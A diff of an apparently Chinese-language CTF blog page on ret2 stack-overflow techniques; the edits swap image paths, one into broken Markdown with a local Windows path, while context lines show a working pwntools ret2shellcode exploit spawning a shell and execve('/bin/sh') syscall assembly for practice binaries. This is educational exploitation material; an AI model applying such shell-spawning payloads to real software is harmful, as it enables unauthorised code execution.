@@ -84,7 +84,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">buf=<span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line">payload=shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>) + p32(buf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>这题很特殊，IDA中给的是变量地址与ebp的长度是错的</p>
-<img src="/2025/06/25/Several%20ret2%20Attack%20Principles/_Typora\笔记\CTF\PWN\例题\ret2的几种攻击原理总结\image-20251112170255715.png" alt="image-20251112170255715" style="zoom: 80%;">
+<img src="/2025/06/25/Several%20ret2%20Attack%20Principles/hexo\blog\source\_posts\Several ret2 Attack Principles\image-20251112170255715.png" alt="image-20251112170255715" style="zoom: 80%;">
 
 <p>同时这题告诉我们，变量不一定位于栈顶，这里的变量应该是地址0xffffd34c，所以我们计算偏移应该从此处开始</p>
 <p>偏移为108+4&#x3D;112</p>
@@ -103,7 +103,7 @@
 <p>实现系统调用，拿到控制权限，就是要构造下面这一个原本不存在的代码，将寄存器中的值变为指定内容，最后调用<code>int 0x80</code></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, 0xb</span><br><span class="line">mov ebx, [“/bin/sh”] </span><br><span class="line">mov ecx, 0</span><br><span class="line">mov edx, 0</span><br><span class="line">int 0x80</span><br><span class="line">=&gt; execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure>
 
-<img src="/2025/06/25/Several%20ret2%20Attack%20Principles/_Typora\笔记\CTF\PWN\例题\ret2的几种攻击原理总结\image-20250522173550007.png" alt="image-20250522173550007" style="zoom:50%;">
+<img src="/2025/06/25/Several%20ret2%20Attack%20Principles/hexo\blog\source\_posts\Several ret2 Attack Principles\image-20250522173550007.png" alt="image-20250522173550007" style="zoom:50%;">
 
 <p>要找到这几条指定命令，并且将寄存器中值变为指定值</p>
 <p><code>int 0x80</code>是一个表示系统调用的指令<code>int 0x80 (eax=0xb, ebx=&quot;/bin/sh&quot;, ecx=0, edx=0)</code>，其中eax&#x3D;0xb表示的就说一个系统调用函数<code>sys_execue</code>的过程</p>
@@ -195,7 +195,7 @@
 <p>接受函数处还有一点需要我们注意：</p>
 <p><code>recv()</code> 函数的核心作用是<strong>接收字节（<code>bytes</code> 类型）</strong>，而非字符串（<code>str</code> 类型）</p>
 <p>这里通过我们debug调试可以知道需要接受的是</p>
-<p><img src="/2025/06/25/Several%20ret2%20Attack%20Principles/笔记\CTF\PWN\例题\ret2的几种攻击原理总结\image-20251112224901447.png" alt="image-20251112224901447"></p>
+<p>![image-20251112224901447](E:\hexo\blog\source_posts\Several ret2 Attack Principles\image-20251112224901447.png)</p>
 <p>而这里字节流b<code>0xf7d8adb0</code>实际上是10个字节，字节流中，一个字符为一个字节，b<code>\xf7</code>，这个才算是一个字节</p>
 <hr>
 <p>这里就算用<code>recv(10)</code>，结果也是报错，原因如下：</p>
